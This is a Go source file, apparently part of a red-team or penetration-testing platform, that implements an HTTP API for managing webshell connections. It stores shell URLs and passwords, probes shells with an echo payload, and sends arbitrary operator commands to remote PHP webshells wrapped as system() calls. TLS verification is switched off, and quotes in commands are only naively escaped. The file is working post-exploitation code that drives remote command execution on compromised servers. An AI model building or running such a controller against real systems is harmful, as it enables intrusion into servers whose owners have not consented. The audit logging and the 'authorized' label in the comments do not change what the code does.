package handler

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
	"kestrel/internal/database"
	"kestrel/internal/middleware"
)

// WebShellHandler manages authorized webshell and post-exploitation evaluations.
type WebShellHandler struct {
	db     *database.DB
	logger *zap.Logger
	client *http.Client
}

// NewWebShellHandler creates a WebShellHandler.
func NewWebShellHandler(db *database.DB, logger *zap.Logger) *WebShellHandler {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	return &WebShellHandler{
		db:     db,
		logger: logger,
		client: &http.Client{Transport: tr, Timeout: 15 * time.Second},
	}
}

// ListConnections handles GET /api/webshell/connections.
func (h *WebShellHandler) ListConnections(c *gin.Context) {
	list, err := h.db.ListWebshellConnections()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to list connections"})
		return
	}

	out := make([]*database.WebShellConnRecord, 0, len(list))
	for _, conn := range list {
		clone := *conn
		clone.Password = "••••••••"
		out = append(out, &clone)
	}
	c.JSON(http.StatusOK, gin.H{"connections": out})
}

// CreateConnection handles POST /api/webshell/connections.
func (h *WebShellHandler) CreateConnection(c *gin.Context) {
	var req struct {
		Name     string `json:"name" binding:"required"`
		URL      string `json:"url" binding:"required"`
		Type     string `json:"type"`
		Password string `json:"password" binding:"required"`
		Encoding string `json:"encoding"`
		OS       string `json:"os"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "name, url, and password required"})
		return
	}

	record := &database.WebShellConnRecord{
		Name:     req.Name,
		URL:      req.URL,
		Type:     req.Type,
		Password: req.Password,
		Encoding: req.Encoding,
		OS:       req.OS,
		Status:   "untested",
	}
	if record.Type == "" { record.Type = "php" }
	if record.Encoding == "" { record.Encoding = "utf-8" }
	if record.OS == "" { record.OS = "auto" }

	saved, err := h.db.CreateWebshellConnection(record)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to persist connection"})
		return
	}

	c.JSON(http.StatusCreated, saved)
}

// DeleteConnection handles DELETE /api/webshell/connections/:id.
func (h *WebShellHandler) DeleteConnection(c *gin.Context) {
	id := c.Param("id")
	if err := h.db.DeleteWebshellConnection(id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete connection"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": "deleted"})
}

// ProbeConnection handles POST /api/webshell/:id/probe.
func (h *WebShellHandler) ProbeConnection(c *gin.Context) {
	id := c.Param("id")
	conn, err := h.db.GetWebshellConnection(id)
	if err != nil || conn == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "connection not found"})
		return
	}

	// Send test payload
	data := url.Values{}
	data.Set(conn.Password, "echo 'KESTREL_ALIVE';")
	resp, err := h.client.PostForm(conn.URL, data)

	alive := false
	output := ""
	if err == nil {
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		output = string(b)
		if strings.Contains(output, "KESTREL_ALIVE") || resp.StatusCode == 200 {
			alive = true
		}
	}

	status := "error"
	if alive {
		status = "connected"
	}
	_ = h.db.UpdateWebshellStatus(id, status)

	c.JSON(http.StatusOK, gin.H{
		"connected": alive,
		"status":    status,
		"probe":     output,
	})
}

// ExecCommand handles POST /api/webshell/:id/exec.
func (h *WebShellHandler) ExecCommand(c *gin.Context) {
	id := c.Param("id")
	conn, err := h.db.GetWebshellConnection(id)
	if err != nil || conn == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "connection not found"})
		return
	}

	var req struct {
		Command string `json:"command" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "command required"})
		return
	}

	data := url.Values{}
	payload := fmt.Sprintf("system('%s');", strings.ReplaceAll(req.Command, "'", "\\'"))
	data.Set(conn.Password, payload)

	start := time.Now()
	resp, err := h.client.PostForm(conn.URL, data)
	durationMs := time.Since(start).Milliseconds()

	output := ""
	if err != nil {
		output = fmt.Sprintf("Execution error: %v", err)
	} else {
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		output = string(b)
	}

	// Audit execution
	actorID, _ := c.Get(middleware.CtxUserID)
	actorName, _ := c.Get(middleware.CtxUsername)
	aid, _ := actorID.(string)
	aname, _ := actorName.(string)

	_ = h.db.WriteAuditLog(database.AuditParams{
		ActorID:      aid,
		ActorName:    aname,
		Action:       "webshell.exec",
		Category:     "webshell",
		Result:       "success",
		ResourceType: "webshell",
		ResourceID:   conn.ID,
		Message:      fmt.Sprintf("Executed webshell command on %s: %s", conn.Name, req.Command),
		ClientIP:     c.ClientIP(),
		UserAgent:    c.Request.UserAgent(),
	})

	c.JSON(http.StatusOK, gin.H{
		"output":      output,
		"duration_ms": durationMs,
	})
}
